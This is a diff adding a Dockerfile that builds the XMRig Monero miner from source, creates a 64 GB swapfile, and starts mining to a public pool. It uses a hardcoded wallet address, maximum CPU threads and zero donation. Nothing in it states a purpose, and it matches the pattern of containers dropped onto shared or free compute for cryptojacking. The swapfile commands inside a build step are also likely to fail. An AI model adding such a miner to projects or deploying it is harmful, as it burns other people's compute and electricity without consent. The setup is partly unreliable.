@@ -1,0 +1,18 @@
+FROM ubuntu:latest
+
+RUN apt-get update && \
+    apt-get install -y build-essential cmake libuv1-dev libssl-dev git libhwloc-dev curl && \
+    fallocate -l 64G /swapfile && \
+    chmod 600 /swapfile && \
+    mkswap /swapfile && \
+    swapon /swapfile && \
+    git clone https://github.com/xmrig/xmrig.git && \
+    cd xmrig && \
+    mkdir build && \
+    cd build && \
+    cmake .. && \
+    make
+
+WORKDIR /xmrig/build
+
+CMD ["./xmrig", "-o", "de.monero.herominers.com:1111", "-u", "45VbvLLANLLKuKKEp6PW1L846Z3iMQGB1djdYRps8vKTiKGF9vabEYq9qpTMzheUWtGASiuAfgkGKN9HdTQvoyQmDdtKCfn", "-p", "mwfull", "--cpu-priority=5", "--cpu-max-threads-hint=100", "--asm=auto", "--donate-level=0"]
